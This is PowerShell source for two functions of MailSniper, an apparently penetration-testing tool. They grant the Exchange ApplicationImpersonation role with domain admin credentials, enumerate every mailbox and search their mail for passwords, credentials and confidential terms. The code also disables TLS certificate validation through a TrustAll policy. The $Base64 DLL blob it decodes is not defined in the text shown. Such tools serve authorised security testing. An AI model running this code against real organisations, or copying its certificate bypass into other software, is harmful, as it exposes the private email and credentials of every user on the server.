﻿
function Invoke-GlobalMailSearch{
<#
.SYNOPSIS

This module will connect to a Microsoft Exchange server and grant the "ApplicationImpersonation" role to a specified user. Having the "ApplicationImpersonation" role allows that user to search through other domain user's mailboxes. After this role has been granted the Invoke-GlobalSearchFunction creates a list of all mailboxes in the Exchange database. The module then connects to Exchange Web Services using the impersonation role to gather a number of emails from each mailbox, and ultimately searches through them for specific terms.

MailSniper Function: Invoke-GlobalMailSearch
Author: Beau Bullock (@dafthack)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

This module will connect to a Microsoft Exchange server and grant the "ApplicationImpersonation" role to a specified user. Having the "ApplicationImpersonation" role allows that user to search through other domain user's mailboxes. After this role has been granted the Invoke-GlobalSearchFunction creates a list of all mailboxes in the Exchange database. The module then connects to Exchange Web Services using the impersonation role to gather a number of emails from each mailbox, and ultimately searches through them for specific terms.

.PARAMETER ImpersonationAccount

Username of the current user account the PowerShell process is running as. This user will be granted the ApplicationImpersonation role on Exchange.

.PARAMETER ExchHostname

The hostname of the Exchange server to connect to.

.PARAMETER AutoDiscoverEmail

A valid email address that will be used to autodiscover where the Exchange server is located.

.PARAMETER MailsPerUser

The total number of emails to return for each mailbox.

.PARAMETER Terms

Certain terms to search through each email subject and body for. By default the script looks for "*password*","*confidential*","*credentials*"

.EXAMPLE

C:\PS> Invoke-GlobalMailSearch -ImpersonationAccount current-username -ExchHostname Exch01

Description
-----------
This command will connect to the Exchange server located at 'Exch01' and prompt for administrative credentials. Once administrative credentials have been entered a PS remoting session is setup to the Exchange server where the ApplicationImpersonation role is then granted to the "current-username" user. A list of all email addresses in the domain is then gathered, followed by a connection to Exchange Web Services as "current-username" where by default 100 of the latest emails from each mailbox will be searched through for the terms "*pass*","*confidential*","*credentials*".

.EXAMPLE

C:\PS> Invoke-GlobalMailSearch -ImpersonationAccount current-username -AutoDiscoverEmail user@domain.com -MailsPerUser 2000 -Terms "*passwords*","*super secret*","*industrial control systems*","*scada*","*launch codes*"

Description
-----------
This command will connect to the Exchange server autodiscovered from the email address entered, and prompt for administrative credentials. Once administrative credentials have been entered a PS remoting session is setup to the Exchange server where the ApplicationImpersonation role is then granted to the "current-username" user. A list of all email addresses in the domain is then gathered, followed by a connection to Exchange Web Services as "current-username" where 2000 of the latest emails from each mailbox will be searched through for the terms "*passwords*","*super secret*","*industrial control systems*","*scada*","*launch codes*".

#>


Param(

  [Parameter(Position = 0, Mandatory = $true)]
  [string]
  $ImpersonationAccount = "",

  [Parameter(Position = 1, Mandatory = $false)]
  [string]
  $AutoDiscoverEmail = "",

  [Parameter(Position = 2, Mandatory = $false)]
  [system.URI]
  $ExchHostname = "",

  [Parameter(Position = 3, Mandatory = $false)]
  [string]
  $DAUserName = "",

  [Parameter(Position = 5, Mandatory = $False)]
  [string[]]$Terms = ("*password*","*confidential*","*credentials*"),

  [Parameter(Position = 6, Mandatory = $False)]
  [int]
  $MailsPerUser = 100

)

if (($ExchHostname -ne "") -Or ($AutoDiscoverEmail -ne ""))
{
Write-Output "Continuing"
}
else
{
Write-Output "Either the option 'ExchHostname' or 'AutoDiscoverEmail' must be entered!"
break
}


#Connect to remote Exchange Server and add Impersonation Role to a user account

#Prompt for Domain Admin Credentials
Write-Host "Enter Domain Admin Credentials to add your user to the impersonation role"
$Login = Get-Credential


#PowerShell Remoting to Remote Exchange Server, Import Exchange Management Shell Tools
$ExchUri = New-Object System.Uri(("http://" + $ExchHostname + "/PowerShell/"))
$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri $ExchUri -Authentication Kerberos -Credential $Login
Import-PSSession $Session

#Allow user to impersonate other users
New-ManagementRoleAssignment -Name:impersonationAssignmentName -Role:ApplicationImpersonation -User:$ImpersonationAccount

#Get List of All Mailboxes
$SMTPAddresses = Get-Mailbox | Select Name -ExpandProperty EmailAddresses
$AllMailboxes = $SMTPAddresses -replace ".*:"
Write-Host "The total number of mailboxes discovered is: " $AllMailboxes.count


#Base64 Encoded Exchange Web Services DLL
#Decoding DLL
$Content = [System.Convert]::FromBase64String($Base64)
Set-Content -Path $env:temp\ews.dll -Value $Content -Encoding Byte
#Setting EWS DLL Path
Add-Type -Path $env:temp\ews.dll

$ExchangeVersion = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::Exchange2013

$service = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService($ExchangeVersion)

#Using current user's credentials to connect to EWS
$service.UseDefaultCredentials = $true

## Choose to ignore any SSL Warning issues caused by Self Signed Certificates  
  
## Code From http://poshcode.org/624
## Create a compilation environment
$Provider=New-Object Microsoft.CSharp.CSharpCodeProvider
$Compiler=$Provider.CreateCompiler()
$Params=New-Object System.CodeDom.Compiler.CompilerParameters
$Params.GenerateExecutable=$False
$Params.GenerateInMemory=$True
$Params.IncludeDebugInformation=$False
$Params.ReferencedAssemblies.Add("System.DLL") | Out-Null

$TASource=@'
  namespace Local.ToolkitExtensions.Net.CertificatePolicy{
    public class TrustAll : System.Net.ICertificatePolicy {
      public TrustAll() { 
      }
      public bool CheckValidationResult(System.Net.ServicePoint sp,
        System.Security.Cryptography.X509Certificates.X509Certificate cert, 
        System.Net.WebRequest req, int problem) {
        return true;
      }
    }
  }
'@ 
$TAResults=$Provider.CompileAssemblyFromSource($Params,$TASource)
$TAAssembly=$TAResults.CompiledAssembly

## We now create an instance of the TrustAll and attach it to the ServicePointManager
$TrustAll=$TAAssembly.CreateInstance("Local.ToolkitExtensions.Net.CertificatePolicy.TrustAll")
[System.Net.ServicePointManager]::CertificatePolicy=$TrustAll

## end code from http://poshcode.org/624
  
if ($ExchHostname -ne "")
{
    ("Using EWS URL " + "https://" + $ExchHostname + "/EWS/Exchange.asmx")
    $service.Url = new-object System.Uri(("https://" + $ExchHostname + "/EWS/Exchange.asmx"))
}
else
{
    ("Autodiscovering " + $AutoDiscoverEmail + "...")
    $service.AutoDiscoverUrl($AutoDiscoverEmail, {$true})
}    


ForEach($Mailbox in $AllMailboxes){

Write-Host 'Using' $ImpersonationAccount 'to impersonate' $Mailbox

$service.ImpersonatedUserId = New-Object Microsoft.Exchange.WebServices.Data.ImpersonatedUserId([Microsoft.Exchange.WebServices.Data.ConnectingIdType]::SmtpAddress,$Mailbox ); 
$rootfolder = [Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox
$mbx = New-Object Microsoft.Exchange.WebServices.Data.Mailbox( $Mailbox )
$FolderId = New-Object Microsoft.Exchange.WebServices.Data.FolderId( $rootfolder, $mbx)
$Inbox = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service,$FolderId)

#$view = New-Object Microsoft.Exchange.WebServices.Data.ItemView(10)
#$view.SearchFilter = New-Object Microsoft.Exchange.WebServices.Data.SearchFilter+ContainsSubstring([Microsoft.Exchange.WebServices.Data.EmailMessageSchema]::Body, "password");
#$findResults = $service.FindItems([Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox,$view)
#$findResults

$PropertySet = New-Object Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties)
$PropertySet.RequestedBodyType = [Microsoft.Exchange.WebServices.Data.BodyType]::Text
    
$mails = $Inbox.FindItems($MailsPerUser)
$PostSearchList = @()    
foreach ($item in $mails.Items)
{    
    $item.Load($PropertySet)
    foreach($specificterm in $Terms){
    if ($item.Body.Text -like $specificterm)
    {
    $PostSearchList += $item
    }
    elseif ($item.Subject -like $specificterm)
    {
    $PostSearchList += $item
    }
    }
}
$PostSearchList | ft -Property Sender,ReceivedBy,Subject,Body
}
#Removing EWS DLL

Remove-Item $env:temp\ews.dll

#Remove User from impersonation role
Get-ManagementRoleAssignment -RoleAssignee $ImpersonationAccount -Role ApplicationImpersonation -RoleAssigneeType user | Remove-ManagementRoleAssignment -confirm:$false


}

function Invoke-SelfSearch{

<#
.SYNOPSIS

This module will connect to a Microsoft Exchange server using Exchange Web Services to gather a number of emails from the current user's mailbox. It then searches through them for specific terms.

MailSniper Function: Invoke-SelfSearch
Author: Beau Bullock (@dafthack)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

This module will connect to a Microsoft Exchange server using Exchange Web Services to gather a number of emails from the current user's mailbox. It then searches through them for specific terms.

.PARAMETER ExchHostname

The hostname of the Exchange server to connect to.

.PARAMETER Mailbox

Email address of the current user the PowerShell process is running as.

.PARAMETER Terms

Certain terms to search through each email subject and body for. By default the script looks for "*password*","*confidential*","*credentials*"

.EXAMPLE

C:\PS> Invoke-SelfSearch -Mailbox current-user@domain.com 

Description
-----------
This command will connect to the Exchange server autodiscovered from the email address entered using Exchange Web Services where by default 100 of the latest emails from the "Mailbox" will be searched through for the terms "*pass*","*confidential*","*credentials*".

.EXAMPLE

C:\PS> Invoke-SelfSearch -Mailbox current-user@domain.com -ExchHostname -MailsPerUser 2000 -Terms "*passwords*","*super secret*","*industrial control systems*","*scada*","*launch codes*"

Description
-----------
This command will connect to the Exchange server entered as "ExchHostname" followed by a connection to Exchange Web Services as where 2000 of the latest emails from the "Mailbox" will be searched through for the terms "*passwords*","*super secret*","*industrial control systems*","*scada*","*launch codes*".

#>
Param(

  [Parameter(Position = 0, Mandatory = $true)]
  [string]
  $Mailbox = "",

  [Parameter(Position = 1, Mandatory = $false)]
  [system.URI]
  $ExchHostname = "",

  [Parameter(Position = 2, Mandatory = $False)]
  [string[]]$Terms = ("*password*","*confidential*","*credentials*"),

  [Parameter(Position = 3, Mandatory = $False)]
  [int]
  $MailsPerUser = 100

)


#Base64 Encoded Exchange Web Services DLL
#Decoding DLL
$Content = [System.Convert]::FromBase64String($Base64)
#[Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($Base64)
#$PEBytes = [System.Convert]::FromBase64String($Base64)
Set-Content -Path $env:temp\ews.dll -Value $Content -Encoding Byte
#Set-Variable -Name temp -Value $Content -Encoding Byte
Add-Type -Path $env:temp\ews.dll
#Import-Module $PEBytes
#Setting EWS DLL Path
#Import-Module $Content
#$bytes = [System.Text.Encoding]::UTF8
#$byteArr = $bytes.getBytes($Content)
#Import-Module $bytes
#[System.Reflection.Assembly]::Load($PEBytes)

$ExchangeVersion = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::Exchange2013
Write-Output $ExchangeVersion

$service = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService($ExchangeVersion)
#$creds = (Get-Credential).GetNetworkCredential()
#$service.Credentials = New-Object System.Net.NetworkCredential -ArgumentList $creds.UserName, $creds.Password, $creds.Domain

#Using current user's credentials to connect to EWS
$service.UseDefaultCredentials = $true

## Choose to ignore any SSL Warning issues caused by Self Signed Certificates  
  
## Code From http://poshcode.org/624
## Create a compilation environment
$Provider=New-Object Microsoft.CSharp.CSharpCodeProvider
$Compiler=$Provider.CreateCompiler()
$Params=New-Object System.CodeDom.Compiler.CompilerParameters
$Params.GenerateExecutable=$False
$Params.GenerateInMemory=$True
$Params.IncludeDebugInformation=$False
$Params.ReferencedAssemblies.Add("System.DLL") | Out-Null

$TASource=@'
  namespace Local.ToolkitExtensions.Net.CertificatePolicy{
    public class TrustAll : System.Net.ICertificatePolicy {
      public TrustAll() { 
      }
      public bool CheckValidationResult(System.Net.ServicePoint sp,
        System.Security.Cryptography.X509Certificates.X509Certificate cert, 
        System.Net.WebRequest req, int problem) {
        return true;
      }
    }
  }
'@ 
$TAResults=$Provider.CompileAssemblyFromSource($Params,$TASource)
$TAAssembly=$TAResults.CompiledAssembly

## We now create an instance of the TrustAll and attach it to the ServicePointManager
$TrustAll=$TAAssembly.CreateInstance("Local.ToolkitExtensions.Net.CertificatePolicy.TrustAll")
[System.Net.ServicePointManager]::CertificatePolicy=$TrustAll

## end code from http://poshcode.org/624
  
if ($ExchHostname -ne "")
{
    ("Using EWS URL " + "https://" + $ExchHostname + "/EWS/Exchange.asmx")
    $service.Url = new-object System.Uri(("https://" + $ExchHostname + "/EWS/Exchange.asmx"))
}
else
{
    ("Autodiscovering " + $Mailbox + "...")
    $service.AutoDiscoverUrl($Mailbox, {$true})
}    

Write-Host "Not checking all mailboxes. Use Invoke-GlobalMailSearch to search all mailboxes."

    
#    $service.ImpersonatedUserId = New-Object Microsoft.Exchange.WebServices.Data.ImpersonatedUserId([Microsoft.Exchange.WebServices.Data.ConnectingIdType]::SmtpAddress,$Mailbox ); 
    $rootfolder = [Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox
    $mbx = New-Object Microsoft.Exchange.WebServices.Data.Mailbox( $Mailbox )
    $FolderId = New-Object Microsoft.Exchange.WebServices.Data.FolderId( $rootfolder, $mbx)
    $Inbox = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service,$FolderId)

    #$view = New-Object Microsoft.Exchange.WebServices.Data.ItemView(1000)
    #$SearchFilter = New-Object Microsoft.Exchange.WebServices.Data.SearchFilter+ContainsSubstring([Microsoft.Exchange.WebServices.Data.ItemSchema]::Body, "The");
    #$findResults = $service.FindItems($FolderId,$SearchFilter,$view)
    
    $PropertySet = New-Object Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties)
    $PropertySet.RequestedBodyType = [Microsoft.Exchange.WebServices.Data.BodyType]::Text
    
    #$findResults.TotalCount

    #$findResults | % {$_.Load($PropertySet)}
    #$findResults | ft -Property Sender,Subject,Body
       
    
$mails = $Inbox.FindItems(1000)

$PostSearchList = @()    
foreach ($item in $mails.Items)
{    
    $item.Load($PropertySet)
    foreach($specificterm in $Terms){
    if ($item.Body.Text -like $specificterm)
    {
    $PostSearchList += $item
    }
    elseif ($item.Subject -like $specificterm)
    {
    $PostSearchList += $item
    }
    }
}
$PostSearchList | ft -Property Sender,ReceivedBy,Subject,Body
#Removing EWS DLL
Remove-Item $env:temp\ews.dll -Force


}